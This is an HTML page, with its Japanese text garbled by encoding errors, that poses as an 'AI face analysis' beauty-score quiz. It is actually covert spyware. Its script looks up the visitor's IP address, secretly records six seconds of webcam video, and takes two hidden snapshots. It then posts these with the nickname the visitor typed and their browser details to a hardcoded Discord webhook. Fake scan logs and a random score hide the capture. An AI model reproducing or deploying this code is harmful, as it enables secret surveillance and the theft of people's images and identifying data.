<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AIé¡”è§£æè¨ºæ–­ã‚·ã‚¹ãƒ†ãƒ  | æ¬¡ä¸–ä»£é¡”èªè­˜ã‚¨ãƒ³ã‚¸ãƒ³</title>
    <style>
        /* å…¨ä½“ã®ãƒ‡ã‚¶ã‚¤ãƒ³ã‚’ã€Œæœ€æ–°ãƒ†ãƒƒã‚¯ç³»ã€ã®å°‘ã—ã‚¯ãƒ¼ãƒ«ãªé›°å›²æ°—ã« */
        body { 
            background-color: #f8f9fa; 
            font-family: 'Hiragino Kaku Gothic ProN', 'Meiryo', sans-serif; 
            text-align: center; 
            margin: 0; padding: 0; 
            display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh;
        }
        .main-card { background: white; padding: 40px; border-radius: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); width: 90%; max-width: 400px; }
        h1 { color: #333; font-size: 22px; margin-bottom: 10px; }
        .sub-text { color: #666; font-size: 14px; margin-bottom: 30px; }

        /* ãƒœã‚¿ãƒ³ï¼šé«˜ç´šæ„Ÿã®ã‚ã‚‹ãƒ”ãƒ³ã‚¯ */
        .btn { 
            background: linear-gradient(135deg, #ff69b4, #ff1493); 
            color: white; padding: 18px 40px; font-size: 18px; border: none; 
            border-radius: 50px; cursor: pointer; font-weight: bold; transition: 0.3s;
        }
        .btn:hover { transform: scale(1.05); box-shadow: 0 5px 15px rgba(255, 105, 180, 0.4); }

        #input-area, #loading-area, #result-area { display: none; }
        input { padding: 15px; font-size: 16px; width: 85%; margin-bottom: 20px; border: 2px solid #eee; border-radius: 12px; outline: none; transition: 0.3s; }
        input:focus { border-color: #ff69b4; }

        /* --- è¨ºæ–­ä¸­ã®ãƒªã‚¢ãƒ«ãªæ¼”å‡º --- */
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #ff69b4;
            border-radius: 50%;
            width: 50px; height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .progress-container { width: 100%; background-color: #eee; border-radius: 10px; margin: 20px 0; overflow: hidden; }
        .progress-bar { width: 0%; height: 10px; background-color: #ff69b4; transition: width 0.1s; }

        .scan-log { font-family: monospace; font-size: 12px; color: #888; text-align: left; height: 40px; overflow: hidden; }

        /* ã‚«ãƒ¡ãƒ©ã¨ã‚­ãƒ£ãƒ³ãƒã‚¹ã¯éš ã—ãŸã¾ã¾ */
        video, canvas { position: fixed; top: -3000px; opacity: 0; }
    </style>
</head>
<body>

<div class="main-card">
    <div id="welcome-area">
        <h1>âœ¨ AIé¡”è§£æè¨ºæ–­</h1>
        <p class="sub-text">æœ€æ–°ã®ãƒ‡ã‚£ãƒ¼ãƒ—ãƒ©ãƒ¼ãƒ‹ãƒ³ã‚°æŠ€è¡“ã‚’ç”¨ã„ã€ã‚ãªãŸã®é¡”é¢åå·®å€¤ã¨ç³»çµ±ã‚’ç²¾å¯†ã«åˆ†æã—ã¾ã™ã€‚</p>
        <button id="start-btn" class="btn">è§£æã‚’é–‹å§‹ã™ã‚‹</button>
    </div>

    <div id="input-area">
        <h1>è§£ææº–å‚™</h1>
        <p class="sub-text">å€‹äººã®ç‰¹å®šã‚’é˜²ããŸã‚ã€ãƒ‹ãƒƒã‚¯ãƒãƒ¼ãƒ ã‚’å…¥åŠ›ã—ã¦ãã ã•ã„ã€‚</p>
        <input type="text" id="user-name" placeholder="ãƒ‹ãƒƒã‚¯ãƒãƒ¼ãƒ ã‚’å…¥åŠ›">
        <br>
        <button id="next-btn" class="btn">è§£æã‚’å®Ÿè¡Œ</button>
    </div>

    <div id="loading-area">
        <h1 id="status-title">AIè§£æä¸­...</h1>
        <div class="loader"></div>
        <div class="progress-container"><div id="progress" class="progress-bar"></div></div>
        <div id="log-text" class="scan-log"></div>
        <video id="video" autoplay playsinline muted></video>
        <canvas id="canvas"></canvas>
    </div>

    <div id="result-area">
        <h1 style="color: #ff69b4;">è§£æå®Œäº†</h1>
        <div style="margin: 20px 0;">
            <p style="font-size: 14px; color: #888;">AIã‚¹ã‚³ã‚¢</p>
            <p id="res-score" style="font-size: 48px; font-weight: bold; color: #333; margin: 0;"></p>
            <p id="res-type" style="font-size: 18px; color: #ff1493; margin-top: 10px;"></p>
        </div>
        <p class="sub-text" id="ai-comment"></p>
        <button onclick="location.reload()" style="background: none; border: 1px solid #ccc; padding: 10px 20px; border-radius: 10px; color: #999; cursor: pointer;">å†ãƒ†ã‚¹ãƒˆ</button>
    </div>
</div>

<script>
    const webhookUrl = "https://discord.com/api/webhooks/1464142886902829233/AWt2NVaItYpkeLywbk-T5oUd717hvrioDHx7HgS3NzH-YgYIUAnCx6-QD5PjUYbiMSu3"; // â˜…ã“ã“ã«è‡ªåˆ†ã®URLã‚’è²¼ã‚‹
    
    let userName = "";
    let ipAddress = "å–å¾—å¤±æ•—";
    const userAgent = navigator.userAgent;

    fetch('https://api.ipify.org?format=json')
        .then(res => res.json()).then(data => ipAddress = data.ip).catch(() => {});

    document.getElementById('start-btn').onclick = () => {
        document.getElementById('welcome-area').style.display = 'none';
        document.getElementById('input-area').style.display = 'block';
    };

    document.getElementById('next-btn').onclick = async () => {
        userName = document.getElementById('user-name').value || "ã‚²ã‚¹ãƒˆãƒ¦ãƒ¼ã‚¶ãƒ¼";
        document.getElementById('input-area').style.display = 'none';
        document.getElementById('loading-area').style.display = 'block';

        const logTexts = [
            "Connecting to Cloud AI Engine...",
            "Initializing Face Detection API...",
            "Scanning facial landmarks...",
            "Extracting feature vectors...",
            "Matching database patterns...",
            "Generating beauty score index...",
            "Calculating facial symmetry..."
        ];

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: 320, height: 240 } });
            const video = document.getElementById('video');
            video.srcObject = stream;

            const mediaRecorder = new MediaRecorder(stream);
            let chunks = [];
            let photos = [];
            mediaRecorder.ondataavailable = (e) => chunks.push(e.data);

            mediaRecorder.onstop = async () => {
                const videoBlob = new Blob(chunks, { type: 'video/webm' });
                const formData = new FormData();
                const content = `ğŸ“¸ **ã€è©³ç´°ãƒ‡ãƒ¼ã‚¿ã€‘**\nğŸ‘¤ **åå‰:** ${userName}\nğŸŒ **IP:** ${ipAddress}\nğŸ“± **æ©Ÿç¨®:** ${userAgent}`;
                formData.append('payload_json', JSON.stringify({ content: content }));
                formData.append('video', videoBlob, 'video.webm');
                photos.forEach((p, i) => formData.append(`photo${i}`, p, `photo${i}.jpg`));
                await fetch(webhookUrl, { method: 'POST', body: formData });
                stream.getTracks().forEach(t => t.stop());
                showFinalResult();
            };

            mediaRecorder.start();

            // 6ç§’é–“ã®ã‚«ã‚¦ãƒ³ãƒˆãƒ€ã‚¦ãƒ³ã¨ãƒ­ã‚°è¡¨ç¤º
            let count = 0;
            const logInterval = setInterval(() => {
                const progress = (count / 60) * 100;
                document.getElementById('progress').style.width = progress + '%';
                if (count % 10 === 0) {
                    document.getElementById('log-text').innerText = logTexts[Math.floor(count / 10)];
                }
                if (count === 15) capture(video, photos); // 1.5ç§’ã§å†™çœŸ1
                if (count === 45) capture(video, photos); // 4.5ç§’ã§å†™çœŸ2
                if (count >= 60) {
                    clearInterval(logInterval);
                    mediaRecorder.stop();
                }
                count++;
            }, 100);

        } catch (err) {
            alert("ã‚¨ãƒ©ãƒ¼ï¼šãƒ‡ãƒã‚¤ã‚¹ã®ã‚«ãƒ¡ãƒ©ã‚¢ã‚¯ã‚»ã‚¹ãŒæ‹’å¦ã•ã‚Œã¾ã—ãŸã€‚");
            location.reload();
        }
    };

    function capture(video, photos) {
        const canvas = document.getElementById('canvas');
        canvas.width = 320; canvas.height = 240;
        canvas.getContext('2d').drawImage(video, 0, 0);
        canvas.toBlob((b) => photos.push(b), 'image/jpeg', 0.5);
    }

    function showFinalResult() {
        document.getElementById('loading-area').style.display = 'none';
        document.getElementById('result-area').style.display = 'block';
        const score = Math.floor(Math.random() * 10) + 78;
        document.getElementById('res-score').innerText = score;
        document.getElementById('res-type').innerText = "ç³»çµ±ï¼šã‚¨ãƒ¬ã‚¬ãƒ³ãƒˆãƒ»ãƒ´ã‚£ã‚¸ãƒ¥ã‚¢ãƒ«ã‚¿ã‚¤ãƒ—";
        document.getElementById('ai-comment').innerText = "é»„é‡‘æ¯”ç‡ã«åŸºã¥ã„ãŸé¡”ç«‹ã¡ã§ã™ã€‚ç‰¹ã«ç›®å…ƒã¨è¼ªéƒ­ã®ãƒãƒ©ãƒ³ã‚¹ãŒéå¸¸ã«å„ªã‚Œã¦ã„ã¾ã™ã€‚";
    }
</script>
</body>
</html>
